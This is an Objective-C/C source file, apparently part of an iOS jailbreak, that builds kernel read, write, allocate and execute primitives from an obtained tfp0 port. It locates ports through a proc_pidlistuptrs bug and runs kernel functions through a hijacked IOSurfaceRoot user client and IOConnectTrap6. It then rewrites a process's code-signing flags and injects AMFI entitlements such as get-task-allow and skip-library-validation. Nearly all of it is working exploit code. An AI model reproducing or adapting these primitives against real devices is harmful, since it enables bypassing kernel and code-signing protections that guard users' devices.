#import "kern_utils.h"
#import "patchfinder64.h"
#import "offsets.h"
#include "find_port.h"

extern mach_port_t tfpzero;
extern uint64_t kernel_base;
extern uint64_t kernel_slide;

extern mach_port_t user_client;
extern uint64_t fake_client;

unsigned offsetof_p_pid = 0x10;               // proc_t::p_pid
unsigned offsetof_task = 0x18;                // proc_t::task
unsigned offsetof_p_ucred = 0x100;            // proc_t::p_ucred
unsigned offsetof_p_csflags = 0x2a8;          // proc_t::p_csflags
unsigned offsetof_itk_self = 0xD8;            // task_t::itk_self (convert_task_to_port)
unsigned offsetof_itk_sself = 0xE8;           // task_t::itk_sself (task_get_special_port)
unsigned offsetof_itk_bootstrap = 0x2b8;      // task_t::itk_bootstrap (task_get_special_port)
unsigned offsetof_ip_mscount = 0x9C;          // ipc_port_t::ip_mscount (ipc_port_make_send)
unsigned offsetof_ip_srights = 0xA0;          // ipc_port_t::ip_srights (ipc_port_make_send)
unsigned offsetof_special = 2 * sizeof(long); // host::special

#define	CS_VALID		0x0000001	/* dynamically valid */
#define CS_ADHOC		0x0000002	/* ad hoc signed */
#define CS_GET_TASK_ALLOW	0x0000004	/* has get-task-allow entitlement */
#define CS_INSTALLER		0x0000008	/* has installer entitlement */

#define	CS_HARD			0x0000100	/* don't load invalid pages */
#define	CS_KILL			0x0000200	/* kill process if it becomes invalid */
#define CS_CHECK_EXPIRATION	0x0000400	/* force expiration checking */
#define CS_RESTRICT		0x0000800	/* tell dyld to treat restricted */
#define CS_ENFORCEMENT		0x0001000	/* require enforcement */
#define CS_REQUIRE_LV		0x0002000	/* require library validation */
#define CS_ENTITLEMENTS_VALIDATED	0x0004000

#define	CS_ALLOWED_MACHO	0x00ffffe

#define CS_EXEC_SET_HARD	0x0100000	/* set CS_HARD on any exec'ed process */
#define CS_EXEC_SET_KILL	0x0200000	/* set CS_KILL on any exec'ed process */
#define CS_EXEC_SET_ENFORCEMENT	0x0400000	/* set CS_ENFORCEMENT on any exec'ed process */
#define CS_EXEC_SET_INSTALLER	0x0800000	/* set CS_INSTALLER on any exec'ed process */

#define CS_KILLED		0x1000000	/* was killed by kernel for invalidity */
#define CS_DYLD_PLATFORM	0x2000000	/* dyld used to load this is a platform binary */
#define CS_PLATFORM_BINARY	0x4000000	/* this is a platform binary */
#define CS_PLATFORM_PATH	0x8000000	/* platform binary by the fact of path (osx only) */

size_t kread(uint64_t where, void *p, size_t size) {
	int rv;
	size_t offset = 0;
	while (offset < size) {
		mach_vm_size_t sz, chunk = 2048;
		if (chunk > size - offset) {
			chunk = size - offset;
		}
		rv = mach_vm_read_overwrite(tfpzero, where + offset, chunk, (mach_vm_address_t)p + offset, &sz);
		if (rv || sz == 0) {
			fprintf(stderr, "[e] error reading kernel @%p\n", (void *)(offset + where));
			break;
		}
		offset += sz;
	}
	return offset;
}

size_t kwrite(uint64_t where, const void *p, size_t size) {
	int rv;
	size_t offset = 0;
	while (offset < size) {
		size_t chunk = 2048;
		if (chunk > size - offset) {
			chunk = size - offset;
		}
		rv = mach_vm_write(tfpzero, where + offset, (mach_vm_offset_t)p + offset, chunk);
		if (rv) {
			fprintf(stderr, "[e] error writing kernel @%p\n", (void *)(offset + where));
			break;
		}
		offset += chunk;
	}
	return offset;
}

uint64_t kalloc(vm_size_t size){
	mach_vm_address_t address = 0;
	mach_vm_allocate(tfpzero, (mach_vm_address_t *)&address, size, VM_FLAGS_ANYWHERE);
	return address;
}

uint32_t rk32(uint64_t kaddr) {
  kern_return_t err;
  uint32_t val = 0;
  mach_vm_size_t outsize = 0;
	
  err = mach_vm_read_overwrite(tfpzero,
                               (mach_vm_address_t)kaddr,
                               (mach_vm_size_t)sizeof(uint32_t),
                               (mach_vm_address_t)&val,
                               &outsize);
  if (err != KERN_SUCCESS){
    printf("tfp0 read failed %s addr: 0x%llx err:%x port:%x\n", mach_error_string(err), kaddr, err, tfpzero);
    sleep(3);
    return 0;
  }
  
  if (outsize != sizeof(uint32_t)){
    printf("tfp0 read was short (expected %lx, got %llx\n", sizeof(uint32_t), outsize);
    sleep(3);
    return 0;
  }
  return val;
}

uint64_t rk64(uint64_t kaddr) {
  uint64_t lower = rk32(kaddr);
  uint64_t higher = rk32(kaddr+4);
  uint64_t full = ((higher<<32) | lower);
  return full;
}

void wk32(uint64_t kaddr, uint32_t val) {
  if (tfpzero == MACH_PORT_NULL) {
    printf("attempt to write to kernel memory before any kernel memory write primitives available\n");
    sleep(3);
    return;
  }
  
  kern_return_t err;
  err = mach_vm_write(tfpzero,
                      (mach_vm_address_t)kaddr,
                      (vm_offset_t)&val,
                      (mach_msg_type_number_t)sizeof(uint32_t));
  
  if (err != KERN_SUCCESS) {
    printf("tfp0 write failed: %s %x\n", mach_error_string(err), err);
    return;
  }
}

void wk64(uint64_t kaddr, uint64_t val) {
  uint32_t lower = (uint32_t)(val & 0xffffffff);
  uint32_t higher = (uint32_t)(val >> 32);
  wk32(kaddr, lower);
  wk32(kaddr+4, higher);
}

mach_port_t prepare_user_client() {
  kern_return_t err;
  mach_port_t user_client;
  io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
  
  if (service == IO_OBJECT_NULL){
    printf(" [-] unable to find service\n");
    exit(EXIT_FAILURE);
  }
  
  err = IOServiceOpen(service, mach_task_self(), 0, &user_client);
  if (err != KERN_SUCCESS){
    printf(" [-] unable to get user client connection\n");
    exit(EXIT_FAILURE);
  }
  
  
  printf("got user client: 0x%x\n", user_client);
  return user_client;
}

uint64_t find_port_address(mach_port_name_t port, int disposition) {
  return find_port_via_proc_pidlistuptrs_bug(port, disposition);
}

uint64_t cached_task_self_addr = 0;
uint64_t task_self_addr() {
  if (cached_task_self_addr == 0) {
    cached_task_self_addr = find_port_address(mach_task_self(), MACH_MSG_TYPE_COPY_SEND);
    printf("task self: 0x%llx\n", cached_task_self_addr);
  }
  return cached_task_self_addr;
}

uint64_t find_port(mach_port_name_t port){
  uint64_t task_port_addr = task_self_addr();
  
  uint64_t task_addr = rk64(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
  
  uint64_t itk_space = rk64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
  
  uint64_t is_table = rk64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
  
  uint32_t port_index = port >> 8;
  const int sizeof_ipc_entry_t = 0x18;
  
  uint64_t port_addr = rk64(is_table + (port_index * sizeof_ipc_entry_t));
  return port_addr;
}

#define OSDictionary_ItemCount(dict) rk32(dict+20)
#define OSDictionary_ItemBuffer(dict) rk64(dict+32)
#define OSDictionary_ItemKey(buffer, idx) rk64(buffer+16*idx)
#define OSDictionary_ItemValue(buffer, idx) rk64(buffer+16*idx+8)
                uint32_t SetObjectWithCharP = 8*31;
#define OSDictionary_SetItem(dict, str, val) {\
uint64_t s = kalloc(strlen(str)+1); kwrite(s, str, strlen(str)); \
kexecute(user_client, fake_client, rk64(rk64(dict)+SetObjectWithCharP), dict, s, val, 0, 0, 0, 0); \
            }
#define OSString_CStringPtr(str) rk64(str+0x10)

uint64_t kexecute(mach_port_t user_client, uint64_t fake_client, uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6) {
    // When calling IOConnectTrapX, this makes a call to iokit_user_client_trap, which is the user->kernel call (MIG). This then calls IOUserClient::getTargetAndTrapForIndex
    // to get the trap struct (which contains an object and the function pointer itself). This function calls IOUserClient::getExternalTrapForIndex, which is expected to return a trap.
    // This jumps to our gadget, which returns +0x40 into our fake user_client, which we can modify. The function is then called on the object. But how C++ actually works is that the
    // function is called with the first arguement being the object (referenced as `this`). Because of that, the first argument of any function we call is the object, and everything else is passed
    // through like normal.
    
    // Because the gadget gets the trap at user_client+0x40, we have to overwrite the contents of it
    // We will pull a switch when doing so - retrieve the current contents, call the trap, put back the contents
    // (i'm not actually sure if the switch back is necessary but meh)
    
    uint64_t offx20 = rk64(fake_client+0x40);
    uint64_t offx28 = rk64(fake_client+0x48);
    wk64(fake_client+0x40, x0);
    wk64(fake_client+0x48, addr);
    uint64_t returnval = IOConnectTrap6(user_client, 0, (uint64_t)(x1), (uint64_t)(x2), (uint64_t)(x3), (uint64_t)(x4), (uint64_t)(x5), (uint64_t)(x6));
    wk64(fake_client+0x40, offx20);
    wk64(fake_client+0x48, offx28);
    return returnval;
}

int setcsflags(int pd){
    int tries = 3;
    while (tries-- > 0) {
        sleep(1);
        uint64_t proc = rk64(find_allproc());
        while (proc) {
            uint32_t pid = rk32(proc + offsetof_p_pid);
            if (pid == pd) {
                uint32_t csflags = rk32(proc + offsetof_p_csflags);
                NSLog(@"Previous CSFlags: 0x%x", csflags);

                csflags = (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT  | CS_HARD);
                NSLog(@"New CSFlags: 0x%x", csflags);
                wk32(proc + offsetof_p_csflags, csflags);

                // AMFI entitlements
                NSLog(@"%@",@"AMFI:");
                uint64_t proc_ucred = rk64(proc+0x100);
                uint64_t amfi_entitlements = rk64(rk64(proc_ucred+0x78)+0x8);
                
                for (int idx = 0; idx < OSDictionary_ItemCount(amfi_entitlements); idx++) {
                    uint64_t key = OSDictionary_ItemKey(OSDictionary_ItemBuffer(amfi_entitlements), idx);
                    uint64_t keyOSStr = OSString_CStringPtr(key);
                    size_t length = kexecute(user_client, fake_client, 0xFFFFFFF00709BDE0+kernel_slide, keyOSStr, 0, 0, 0, 0, 0, 0); //strlen
                    char* s = (char*)calloc(length+1, 1);
                    kread(keyOSStr, s, length);
                    NSLog(@"Entitlement: %s", s);
                    free(s);
                }

                NSLog(@"%@",@"Setting Entitlements...");

                OSDictionary_SetItem(amfi_entitlements, "get-task-allow", find_OSBoolean_True());
                OSDictionary_SetItem(amfi_entitlements, "com.apple.private.skip-library-validation", find_OSBoolean_True());

                for (int idx = 0; idx < OSDictionary_ItemCount(amfi_entitlements); idx++) {
                    uint64_t key = OSDictionary_ItemKey(OSDictionary_ItemBuffer(amfi_entitlements), idx);
                    uint64_t keyOSStr = OSString_CStringPtr(key);
                    size_t length = kexecute(user_client, fake_client, 0xFFFFFFF00709BDE0+kernel_slide, keyOSStr, 0, 0, 0, 0, 0, 0); //strlen
                    char* s = (char*)calloc(length+1, 1);
                    kread(keyOSStr, s, length);
                    NSLog(@"Entitlement: %s", s);
                    free(s);
                }

                tries = 0;
                break;
            }
            proc = rk64(proc);
        }
    }
    return 0;
}